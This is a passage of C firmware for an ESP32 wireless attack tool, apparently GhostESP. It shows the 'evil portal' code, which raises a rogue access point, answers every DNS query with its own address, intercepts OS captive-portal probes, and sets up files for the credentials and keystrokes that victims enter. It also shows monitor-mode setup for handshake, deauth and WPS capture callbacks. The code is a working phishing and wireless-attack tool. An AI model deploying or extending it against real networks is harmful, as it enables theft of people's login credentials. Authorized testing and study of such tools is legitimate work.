    if (client_addr != 0 && !portal_http_rate_limit_allow(client_addr)) {
        httpd_resp_set_hdr(req, "Connection", "close");
        httpd_resp_set_status(req, "429 Too Many Requests");
        httpd_resp_send(req, "Too many requests", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }

    ESP_LOGD(TAG, "Free heap at redirect handler entry: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
    // Log Host header and User-Agent for diagnostics (help debug iOS probe behavior)
    char *req_host = get_host_from_req(req);
    if (req_host) {
        ESP_LOGD(TAG, "Redirect handler Host header: %s", req_host);
        free(req_host);
    } else {
        ESP_LOGD(TAG, "Redirect handler: Host header not present");
    }
    size_t ua_len = httpd_req_get_hdr_value_len(req, "User-Agent");
    if (ua_len > 0 && ua_len <= PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
        char *ua = malloc(ua_len + 1);
        if (ua) {
            if (httpd_req_get_hdr_value_str(req, "User-Agent", ua, ua_len + 1) == ESP_OK) {
                ESP_LOGD(TAG, "Redirect handler User-Agent: %s", ua);
            }
            free(ua);
        }
    } else if (ua_len > PORTAL_MAX_DIAGNOSTIC_HEADER_SIZE) {
        ESP_LOGW(TAG, "Ignoring oversized User-Agent header (%zu bytes)", ua_len);
    }
    if (login_done) {
        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
        httpd_resp_set_status(req, "204 No Content");
        httpd_resp_send(req, NULL, 0);
        return ESP_OK;
    }
    const char *uri = req->uri;
    if (
        (strncmp(uri, "/generate_204", 13) == 0 && (uri[13] == '\0' || uri[13] == '?' )) ||
        (strncmp(uri, "/gen_204", 8) == 0 && (uri[8] == '\0' || uri[8] == '?' )) ||
        (strncmp(uri, "/connecttest.txt", 16) == 0 && (uri[16] == '\0' || uri[16] == '?' )) ||
        (strncmp(uri, "/ncsi.txt", 9) == 0 && (uri[9] == '\0' || uri[9] == '?' )) ||
        (strncmp(uri, "/check_network_status.txt", 25) == 0 && (uri[25] == '\0' || uri[25] == '?' )) ||
        (strncmp(uri, "/success.txt", 12) == 0 && (uri[12] == '\0' || uri[12] == '?' )) ||
        (strncmp(uri, "/library/test/success.html", 26) == 0 && (uri[26] == '\0' || uri[26] == '?' )) ||
        (strncmp(uri, "/success.html", 13) == 0 && (uri[13] == '\0' || uri[13] == '?' )) ||
        (uri[0] == '/' && (uri[1] == '\0' || uri[1] == '?')) ||
        (strncmp(uri, "/redirect", 9) == 0 && (uri[9] == '\0' || uri[9] == '?' ))
    ) {
        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
        esp_err_t r = portal_handler(req);
        ESP_LOGD(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
        return r;
    }
    // minimal logging for captive probe

    if (strncmp(req->uri, "/get", 4) == 0 &&
        (req->uri[4] == '\0' || req->uri[4] == '?')) {
        get_info_handler(req);
        return ESP_OK;
    }

    const char *u = req->uri;
    size_t ulen = strlen(u);
    bool is_html = (ulen >= 5 && strcmp(u + ulen - 5, ".html") == 0);

    if (is_html && html_buffer != NULL && html_buffer_size > 0) {
        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
        esp_err_t r = portal_handler(req);
        ESP_LOGD(TAG, "Served HTML URL via buffer portal for URI: %s", u);
        ESP_LOGD(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size());
        return r;
    }

    if (ulen >= 4 && (strcmp(u + ulen - 4, ".png") == 0 || strcmp(u + ulen - 4, ".jpg") == 0 || strcmp(u + ulen - 4, ".css") == 0 || strcmp(u + ulen - 3, ".js") == 0)) {
        file_handler(req);
        return ESP_OK;
    }

    if (is_html) {
        file_handler(req);
        return ESP_OK;
    }

    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    httpd_resp_set_status(req, "302 Found");
    httpd_resp_set_hdr(req, "Location", "http://192.168.4.1/login");
    httpd_resp_send(req, NULL, 0);
    ESP_LOGD(TAG, "Free heap at redirect handler exit: %" PRIu32 " bytes", esp_get_free_heap_size()); // Log heap size
    return ESP_OK;
}

static esp_err_t apple_probe_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    if (login_done) {
        httpd_resp_set_status(req, "200 OK");
        httpd_resp_set_type(req, "text/html");
        const char *success_response = "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";
        httpd_resp_send(req, success_response, strlen(success_response));
        return ESP_OK;
    } else {
        return portal_handler(req);
    }
}

static esp_err_t captive_portal_head_ok_handler(httpd_req_t *req) {
    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
    if (login_done) {
        httpd_resp_set_status(req, "204 No Content");
    } else {
        httpd_resp_set_status(req, "302 Found");
        httpd_resp_set_hdr(req, "Location", "/login");
    }
    httpd_resp_send(req, NULL, 0);
    return ESP_OK;
}

static void portal_log_heap_caps(const char *where) {
    const size_t free8 = heap_caps_get_free_size(MALLOC_CAP_8BIT);
    const size_t free_internal = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    const size_t largest_internal = heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    const size_t free_spiram = heap_caps_get_free_size(MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
    ESP_LOGI(TAG, "portal heap %s: free8=%u internal=%u largest_internal=%u spiram=%u",
             where,
             (unsigned)free8,
             (unsigned)free_internal,
             (unsigned)largest_internal,
             (unsigned)free_spiram);
}

httpd_handle_t start_portal_webserver(void) {
    // Stop any existing server instance to prevent EADDRINUSE (error 112)
    if (evilportal_server != NULL) {
        printf("Stopping existing portal webserver before starting new one\n");
        httpd_stop(evilportal_server);
        evilportal_server = NULL;
        vTaskDelay(pdMS_TO_TICKS(100)); // Small delay to ensure port is released
    }

    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 32;
    config.max_open_sockets = 13; // Increased from 7
    config.backlog_conn = 10;     // Increased from 7
    config.server_port = 80;
    // ctrl_port must be unique across all httpd instances (ap_manager uses 32768)
    config.ctrl_port = 32769;
    config.lru_purge_enable = true;
    config.stack_size = 4096;
    // Short socket timeouts so a flooded or stalled client cannot pin a socket
    // for long.  These apply to the portal server only.
    config.recv_wait_timeout = 3;
    config.send_wait_timeout = 3;
#if CONFIG_FREERTOS_UNICORE
    config.core_id = 0;
#endif

    portal_log_heap_caps("pre_start");

    esp_err_t ret = ESP_FAIL;
    for (int ctrl_try = 0; ctrl_try < 4; ctrl_try++) {
        config.ctrl_port = 32769 + ctrl_try;
        ret = httpd_start(&evilportal_server, &config);

        if (ret == ESP_ERR_HTTPD_TASK && config.stack_size > 3072) {
            ESP_LOGW(TAG, "portal httpd_start failed with ESP_ERR_HTTPD_TASK, retrying with smaller stack");
            portal_log_heap_caps("start_failed_httpd_task");
            config.stack_size = 3072;
            vTaskDelay(pdMS_TO_TICKS(50));
            ret = httpd_start(&evilportal_server, &config);
        }

        if (ret == ESP_OK) {
            break;
        }

        // most common non-task failure is EADDRINUSE on server_port/ctrl_port
        ESP_LOGW(TAG, "portal httpd_start failed (ctrl_port=%d): %s", config.ctrl_port, esp_err_to_name(ret));
        vTaskDelay(pdMS_TO_TICKS(100));
        evilportal_server = NULL;
    }
    if (ret == ESP_OK) {
        printf("Portal webserver started successfully on port 80\n");
        portal_log_heap_caps("post_start");
        httpd_uri_t portal_uri = {
            .uri = "/login", .method = HTTP_GET, .handler = portal_handler, .user_ctx = NULL};
        httpd_uri_t portal_android_get = {.uri = "/generate_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t portal_android_head = {.uri = "/generate_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t portal_android_gen_get = {.uri = "/gen_204", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t portal_android_gen_head = {.uri = "/gen_204", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t portal_apple_get = {.uri = "/hotspot-detect.html", .method = HTTP_GET, .handler = apple_probe_handler, .user_ctx = NULL};
        httpd_uri_t portal_apple_head = {.uri = "/hotspot-detect.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t portal_root_get = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t portal_root_head = {.uri = "/", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t microsoft_get = {.uri = "/connecttest.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t microsoft_head = {.uri = "/connecttest.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t ncsi_get = {.uri = "/ncsi.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t ncsi_head = {.uri = "/ncsi.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t gnome_get = {.uri = "/check_network_status.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t gnome_head = {.uri = "/check_network_status.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t success_get = {.uri = "/success.txt", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t success_head = {.uri = "/success.txt", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t lib_success_get = {.uri = "/library/test/success.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t lib_success_head = {.uri = "/library/test/success.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t success_html_get = {.uri = "/success.html", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t success_html_head = {.uri = "/success.html", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t redirect_get = {.uri = "/redirect", .method = HTTP_GET, .handler = captive_portal_redirect_handler, .user_ctx = NULL};
        httpd_uri_t redirect_head = {.uri = "/redirect", .method = HTTP_HEAD, .handler = captive_portal_head_ok_handler, .user_ctx = NULL};
        httpd_uri_t log_handler_uri = {
            .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
        httpd_uri_t get_handler_post = {
            .uri = "/get", .method = HTTP_POST, .handler = get_info_handler, .user_ctx = NULL};
        httpd_uri_t portal_png = {
            .uri = ".png", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_jpg = {
            .uri = ".jpg", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_css = {
            .uri = ".css", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_js = {
            .uri = ".js", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
        httpd_uri_t portal_html = {
            .uri = ".html", .method = HTTP_GET,
            .handler = (use_html_buffer ? portal_handler : file_handler), .user_ctx = NULL};
        httpd_register_uri_handler(evilportal_server, &portal_android_get);
        httpd_register_uri_handler(evilportal_server, &portal_android_head);
        httpd_register_uri_handler(evilportal_server, &portal_android_gen_get);
        httpd_register_uri_handler(evilportal_server, &portal_android_gen_head);
        httpd_register_uri_handler(evilportal_server, &portal_apple_get);
        httpd_register_uri_handler(evilportal_server, &portal_apple_head);
        httpd_register_uri_handler(evilportal_server, &portal_root_get);
        httpd_register_uri_handler(evilportal_server, &portal_root_head);
        httpd_register_uri_handler(evilportal_server, &microsoft_get);
        httpd_register_uri_handler(evilportal_server, &microsoft_head);
        httpd_register_uri_handler(evilportal_server, &ncsi_get);
        httpd_register_uri_handler(evilportal_server, &ncsi_head);
        httpd_register_uri_handler(evilportal_server, &gnome_get);
        httpd_register_uri_handler(evilportal_server, &gnome_head);
        httpd_register_uri_handler(evilportal_server, &success_get);
        httpd_register_uri_handler(evilportal_server, &success_head);
        httpd_register_uri_handler(evilportal_server, &lib_success_get);
        httpd_register_uri_handler(evilportal_server, &lib_success_head);
        httpd_register_uri_handler(evilportal_server, &success_html_get);
        httpd_register_uri_handler(evilportal_server, &success_html_head);
        httpd_register_uri_handler(evilportal_server, &redirect_get);
        httpd_register_uri_handler(evilportal_server, &redirect_head);
        httpd_register_uri_handler(evilportal_server, &portal_uri);
        httpd_register_uri_handler(evilportal_server, &log_handler_uri);
        httpd_register_uri_handler(evilportal_server, &get_handler_post);

        httpd_register_uri_handler(evilportal_server, &portal_png);
        httpd_register_uri_handler(evilportal_server, &portal_jpg);
        httpd_register_uri_handler(evilportal_server, &portal_css);
        httpd_register_uri_handler(evilportal_server, &portal_js);
        httpd_register_uri_handler(evilportal_server, &portal_html);
        httpd_uri_t done_uri = { .uri = "/done", .method = HTTP_GET, .handler = done_handler, .user_ctx = NULL };
        httpd_register_uri_handler(evilportal_server, &done_uri);
        httpd_register_err_handler(evilportal_server, HTTPD_404_NOT_FOUND,
                                   captive_portal_redirect_handler);
    } else {
        printf("ERROR: Failed to start portal webserver: %s (0x%x)\n", esp_err_to_name(ret), ret);
        portal_log_heap_caps("start_failed_final");
        evilportal_server = NULL;
    }
    return evilportal_server;
}

static void portal_stop_services_only(void) {
    login_done = false;

    if (dns_handle != NULL) {
        dns_server_handle_t h = dns_handle_take();
        if (h) stop_dns_server(h);
    }

    if (evilportal_server != NULL) {
        httpd_stop(evilportal_server);
        evilportal_server = NULL;
    }
}

esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *SSID, const char *Password,
                                          const char *ap_ssid, const char *domain) {
    if (!wifi_ctrl_lock(pdMS_TO_TICKS(2000))) {
        ESP_LOGE(TAG, "portal start: wifi ctrl mutex lock failed");
        return ESP_FAIL;
    }
    ghostchi_manager_add_xp(5);

    // temporarily increase wifi logging while debugging portal association failures
    esp_log_level_set("wifi", ESP_LOG_WARN);

    // restarting a portal while it's active must tear down http/dns first, otherwise
    // the httpd/dns tasks keep using wifi while we stop/reconfigure it and we crash
    portal_stop_services_only();

    login_done = false; // Reset login state on start
    current_creds_filename[0] = '\0';
    current_keystrokes_filename[0] = '\0';
    s_portal_keystroke_len = 0;
    s_portal_creds_len = 0;
    s_portal_log_window_started_us = 0;
    s_portal_log_requests_in_window = 0;
    s_portal_last_flush_us = 0;
    memset(s_portal_http_rl_table, 0, sizeof(s_portal_http_rl_table));
    portal_sd_jit_mounted = false;
    portal_display_suspended = false;
    // JIT-mount SD only when the active transport requires it.
    if (sd_card_needs_jit_mount() && !sd_card_manager.is_initialized) {
        if (sd_card_mount_for_flush(&portal_display_suspended) == ESP_OK) {
            portal_sd_jit_mounted = true;
        }
    }
    // Log HTML buffer state at portal startup
    ESP_LOGI(TAG, "Evil portal starting - HTML buffer state: buffer=%p, size=%zu, use_html_buffer=%s", 
        html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");

    // Log first 100 characters of captured HTML if available
    if (html_buffer != NULL && html_buffer_size > 0) {
    char preview[101];
    size_t preview_len = html_buffer_size > 100 ? 100 : html_buffer_size;
    memcpy(preview, html_buffer, preview_len);
    preview[preview_len] = '\0';
    ESP_LOGI(TAG, "Captured HTML preview (first %zu chars): %.100s", preview_len, preview);
    }

    // Generate indexed filenames if SD card is available
    if (sd_card_manager.is_initialized) {
        const char* dir_path = "/mnt/ghostesp/evil_portal";
        int creds_index = get_next_file_index(dir_path, "portal_creds", "txt");
        int keys_index = get_next_file_index(dir_path, "portal_keystrokes", "txt");

        if (creds_index >= 0) {
            snprintf(current_creds_filename, sizeof(current_creds_filename),
                     "%s/portal_creds_%d.txt", dir_path, creds_index);
            printf("Logging credentials to: %s\n", current_creds_filename);
        } else {
            printf("Failed to get next index for credentials file.\n");
        }

        if (keys_index >= 0) {
            snprintf(current_keystrokes_filename, sizeof(current_keystrokes_filename),
                     "%s/portal_keystrokes_%d.txt", dir_path, keys_index);
            printf("Logging keystrokes to: %s\n", current_keystrokes_filename);
        } else {
             printf("Failed to get next index for keystrokes file.\n");
        }
    }

    // For JIT-mount builds, pre-load the custom portal HTML while the SD card is
    // mounted so the HTTP server task does not need to remount it.
    if (sd_card_needs_jit_mount()) {
        portal_clear_file_cache();  // discard any leftover cache from a previous portal run
        bool is_local = (URLorFilePath != NULL &&
                         strncmp(URLorFilePath, "http://", 7) != 0 &&
                         strncmp(URLorFilePath, "https://", 8) != 0 &&
                         strcmp(URLorFilePath, "default") != 0);
        if (is_local && sd_card_manager.is_initialized) {
            FILE *pf = fopen(URLorFilePath, "r");
            if (pf != NULL) {
                fseek(pf, 0, SEEK_END);
                long pf_size = ftell(pf);
                rewind(pf);
                if (pf_size > 0 && pf_size <= PORTAL_MAX_FILE_CACHE_SIZE) {
                    char *pf_buf = NULL;
#if CONFIG_SPIRAM
                    pf_buf = (char*)heap_caps_malloc((size_t)pf_size + 1, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
                    if (pf_buf == NULL) {
                        ESP_LOGW(TAG, "PSRAM portal_file_cache failed, trying internal RAM");
                        pf_buf = malloc((size_t)pf_size + 1);
                    }
#else
                    pf_buf = malloc((size_t)pf_size + 1);
#endif
                    if (pf_buf != NULL) {
                        size_t pf_read = fread(pf_buf, 1, (size_t)pf_size, pf);
                        if (pf_read == (size_t)pf_size) {
                            pf_buf[pf_read] = '\0';
                            portal_file_cache      = pf_buf;
                            portal_file_cache_size = pf_read;
                            ESP_LOGI(TAG, "Portal file pre-loaded into cache: %zu bytes from %s",
                                     pf_read, URLorFilePath);
                        } else {
                            ESP_LOGW(TAG, "Portal file cache: incomplete read (%zu/%ld bytes) from %s",
                                     pf_read, pf_size, URLorFilePath);
                            free(pf_buf);
                        }
                    } else {
                        ESP_LOGW(TAG, "Portal file cache: malloc failed for %ld bytes", pf_size);
                    }
                } else {
                    ESP_LOGW(TAG, "Portal file cache: refusing %ld-byte file from %s (limit %u bytes)",
                             pf_size, URLorFilePath, (unsigned)PORTAL_MAX_FILE_CACHE_SIZE);
                }
                fclose(pf);
            } else {
                ESP_LOGW(TAG, "Portal file cache: cannot open %s for pre-load", URLorFilePath);
            }
        }
    }

    // Unmount SD after filename generation (and portal file pre-load) to free SPI bus
    // for display/WiFi operations.
    if (portal_sd_jit_mounted) {
        sd_card_unmount_after_flush(portal_display_suspended);
        // Reset flags since we've unmounted - handlers will JIT mount on demand
        portal_sd_jit_mounted = false;
        portal_display_suspended = false;
    }

    // Check if we need to use the internal default portal
    if (URLorFilePath != NULL && strcmp(URLorFilePath, "default") == 0) {
        strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
    } else if (URLorFilePath != NULL && strlen(URLorFilePath) < sizeof(PORTALURL)) {
        // If not default, copy the provided path
        strlcpy(PORTALURL, URLorFilePath, sizeof(PORTALURL));
    } else {
        // Handle invalid or too long paths by defaulting to internal portal as a fallback
        ESP_LOGW(TAG, "Invalid or too long URL/FilePath provided, defaulting to internal portal.");
        strcpy(PORTALURL, "INTERNAL_DEFAULT_PORTAL");
    }

    // Domain is fetched from settings in commandline.c, just copy it if provided
    if (domain != NULL && strlen(domain) < sizeof(domain_str)) {
         strlcpy(domain_str, domain, sizeof(domain_str));
    } else {
         domain_str[0] = '\0'; // Ensure empty if invalid
    }

    ap_manager_stop_services_keep_wifi();

    // stop wifi before changing mode/config
    esp_err_t stop_err = wifi_stop_safely();
    if (stop_err != ESP_OK) {
        ESP_LOGW(TAG, "portal start: esp_wifi_stop: %s", esp_err_to_name(stop_err));
    }
    vTaskDelay(pdMS_TO_TICKS(150));

    esp_netif_dns_info_t dnsserver;

    uint32_t my_ap_ip = esp_ip4addr_aton("192.168.4.1");

    wifi_config_t ap_config = {.ap = {
                                   .channel = 6,
                                   .ssid_hidden = 0,
                                   .max_connection = 8,
                                   .beacon_interval = 100,
                               }};

    // Configure AP SSID and optional PSK
    if (SSID != NULL && SSID[0] != '\0') {
        strlcpy((char *)ap_config.ap.ssid, SSID, sizeof(ap_config.ap.ssid));
        ap_config.ap.ssid_len = strlen(SSID);
    } else {
        strlcpy((char *)ap_config.ap.ssid, ap_ssid, sizeof(ap_config.ap.ssid));
        ap_config.ap.ssid_len = strlen(ap_ssid);
    }
    if (Password != NULL && Password[0] != '\0') {
        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
        strlcpy((char *)ap_config.ap.password, Password, sizeof(ap_config.ap.password));
        ESP_LOGI(TAG, "portal ap auth: wpa2-psk");
    } else {
        ap_config.ap.authmode = WIFI_AUTH_OPEN;
        memset(ap_config.ap.password, 0, sizeof(ap_config.ap.password));
        ESP_LOGI(TAG, "portal ap auth: open");
    }
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    esp_wifi_set_ps(WIFI_PS_NONE);

    // be conservative for client compatibility (2.4GHz only, HT20 for max compatibility)
    (void)esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW20);
    (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
    dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
    dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    esp_err_t start_err = esp_wifi_start();
    if (start_err != ESP_OK && start_err != ESP_ERR_WIFI_NOT_STARTED) {
        ESP_LOGE(TAG, "portal start: esp_wifi_start failed: %s", esp_err_to_name(start_err));
        wifi_ctrl_unlock();
        return start_err;
    }

    // configure dhcp/dns *after* wifi start so we don't churn dhcps state mid-transition
    esp_netif_ip_info_t ipInfo_ap;
    ipInfo_ap.ip.addr = my_ap_ip;
    ipInfo_ap.gw.addr = my_ap_ip;
    esp_netif_set_ip4_addr(&ipInfo_ap.netmask, 255, 255, 255, 0);

    esp_netif_dhcps_stop(wifiAP);

    // hand out ourselves as dns server
    dhcps_offer_t dhcps_dns_value = OFFER_DNS;
    esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER,
                           &dhcps_dns_value, sizeof(dhcps_dns_value));
    esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);

    // rfc8910 option114: always point to the local portal entrypoint
    const char *cap_uri = "http://192.168.4.1/login";
    esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI,
                           (void *)cap_uri, (uint32_t)(strlen(cap_uri) + 1));

    esp_netif_set_ip_info(wifiAP, &ipInfo_ap);
    esp_netif_dhcps_start(wifiAP);

    start_portal_webserver();

    dns_server_config_t dns_config = {
        .num_of_entries = 1,
        .item = {{.name = "*", .if_key = NULL, .ip = {.addr = ESP_IP4TOADDR(192, 168, 4, 1)}}}};

    dns_handle = start_dns_server(&dns_config);
    if (dns_handle) {
        printf("DNS server started, all requests will be redirected to 192.168.4.1\n");
    } else {
        printf("Failed to start DNS server\n");
    }

    wifi_ctrl_unlock();
    return ESP_OK;
}

void wifi_manager_stop_evil_portal() {
    if (!wifi_ctrl_lock(pdMS_TO_TICKS(2000))) {
        ESP_LOGE(TAG, "portal stop: wifi ctrl mutex lock failed");
        return;
    }

    login_done = false;
    // use forced flush on stop to save data even if heap is critically low
    portal_force_flush_to_sd();
    current_creds_filename[0] = '\0';
    current_keystrokes_filename[0] = '\0';
    
    // Free captured HTML buffer when portal stops to reclaim RAM
    wifi_manager_clear_html_buffer();
    // Free pre-loaded portal file cache (JIT SD-mount builds)
    portal_clear_file_cache();

    if (dns_handle != NULL) {
        dns_server_handle_t h = dns_handle_take();
        if (h) stop_dns_server(h);
    }

    if (evilportal_server != NULL) {
        httpd_stop(evilportal_server);
        evilportal_server = NULL;
    }

    esp_err_t stop_err = wifi_stop_safely();
    if (stop_err != ESP_OK) {
        ESP_LOGW(TAG, "portal stop: esp_wifi_stop: %s", esp_err_to_name(stop_err));
    }
    vTaskDelay(pdMS_TO_TICKS(150));

    ap_manager_init();

    // restore previous wifi log noise level
    esp_log_level_set("wifi", ESP_LOG_ERROR);

    // jit unmount sd if we mounted it for portal start
    if (portal_sd_jit_mounted) {
        sd_card_unmount_after_flush(portal_display_suspended);
        portal_sd_jit_mounted = false;
        portal_display_suspended = false;
    }

    wifi_ctrl_unlock();
}

void wifi_manager_stop_evil_portal_keep_wifi(void) {
    if (!wifi_ctrl_lock(pdMS_TO_TICKS(2000))) {
        ESP_LOGE(TAG, "portal stop: wifi ctrl mutex lock failed");
        return;
    }

    login_done = false;
    portal_force_flush_to_sd();
    current_creds_filename[0] = '\0';
    current_keystrokes_filename[0] = '\0';
    
    wifi_manager_clear_html_buffer();
    portal_clear_file_cache();

    if (dns_handle != NULL) {
        dns_server_handle_t h = dns_handle_take();
        if (h) stop_dns_server(h);
    }

    if (evilportal_server != NULL) {
        httpd_stop(evilportal_server);
        evilportal_server = NULL;
    }

    // DON'T call wifi_stop_safely() - keep STA connected
    vTaskDelay(pdMS_TO_TICKS(50));

    (void)ap_manager_restore_after_attack("portal stop");

    esp_log_level_set("wifi", ESP_LOG_ERROR);

    if (portal_sd_jit_mounted) {
        sd_card_unmount_after_flush(portal_display_suspended);
        portal_sd_jit_mounted = false;
        portal_display_suspended = false;
    }

    wifi_ctrl_unlock();
}

bool wifi_manager_is_evil_portal_active(void) {
    return evilportal_server != NULL || dns_handle != NULL;
}

// Release scan result buffers - delegated to ap_scan module
void wifi_manager_clear_scan_results(void) {
    ap_scan_clear_results();
}

void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
    if (wardriving_is_running()) stop_wardriving();
    wifi_monitor_capture_active = true;
    wifi_reconnect_reset();

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    // Disconnect STA if connected — an associated STA locks the radio to the
    // AP's channel, causing esp_wifi_set_channel() to fail (ESP_FAIL) and
    // preventing channel hopping (e.g. wardriving only sees one channel).
    manual_disconnect = true;
    esp_wifi_disconnect();

    apply_selected_ap_capture_channel_plan(callback);

    // Set hardware-level promiscuous filter based on callback type
    wifi_promiscuous_filter_t filter = {0};
    
    // Determine filter mask based on callback function
    if (callback == wifi_beacon_scan_callback || callback == wifi_probe_scan_callback || 
        callback == wifi_deauth_scan_callback || callback == wifi_pwn_scan_callback ||
        callback == wifi_wps_detection_callback || callback == wifi_listen_probes_callback ||
        callback == wifi_pineap_detector_callback || callback == wardriving_scan_callback) {
        // Management frames only
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    } else if (callback == wifi_eapol_scan_callback) {
        // capture mgmt, data, and ctrl for full handshake context
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL;
    } else if (callback == wifi_track_callback) {
        // tracking needs MGMT (AP beacons) + DATA (active stations);
        // CTRL frames carry no usable RSSI targets, so leave them out.
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    } else {
        // Default: capture all frame types (for raw capture, SAE flood, etc.)
        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
    }
    
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
    ESP_LOGI("WIFI_MANAGER", "Set hardware filter mask: 0x%02" PRIx32, filter.filter_mask);

    // Backing store for handshake/probe/beacon/WPS/wardrive tables (~5KB).
    // Allocated here so RX callbacks never observe a half-built session.
    wifi_callbacks_monitor_tables_ensure();

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    // Verify current channel for capture callbacks that use selected AP channel plans.
    if (callback_uses_selected_ap_capture_plan(callback)) {
        uint8_t ch_primary = 0; wifi_second_chan_t ch_second = WIFI_SECOND_CHAN_NONE;
        esp_err_t get_err = esp_wifi_get_channel(&ch_primary, &ch_second);
        if (get_err == ESP_OK) {
            const char *cap_name = "CAPTURE";
            if (callback == wifi_probe_scan_callback) cap_name = "PROBE";
            else if (callback == wifi_deauth_scan_callback) cap_name = "DEAUTH";
            else if (callback == wifi_beacon_scan_callback) cap_name = "BEACON";
            else if (callback == wifi_raw_scan_callback) cap_name = "RAW";
            else if (callback == wifi_eapol_scan_callback) cap_name = "EAPOL";
            else if (callback == wifi_pwn_scan_callback) cap_name = "PWN";
            else if (callback == wifi_wps_detection_callback) cap_name = "WPS";
            printf("%s: current channel verified as %u\n", cap_name, ch_primary);
        }
    }

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(callback));

    const char *cap_desc = "monitor";
    if (callback == wifi_eapol_scan_callback) cap_desc = "EAPOL";
    else if (callback == wifi_beacon_scan_callback) cap_desc = "beacon";
    else if (callback == wifi_probe_scan_callback) cap_desc = "probe";
    else if (callback == wifi_deauth_scan_callback) cap_desc = "deauth";
    else if (callback == wifi_wps_detection_callback) cap_desc = "wps";
    else if (callback == wifi_raw_scan_callback) cap_desc = "raw";
    else if (callback == wifi_airspace_monitor_callback) cap_desc = "airspace";

    uint8_t ch_primary = 0; wifi_second_chan_t ch_second = WIFI_SECOND_CHAN_NONE;
    (void)esp_wifi_get_channel(&ch_primary, &ch_second);

    const char *filter_desc = "all";
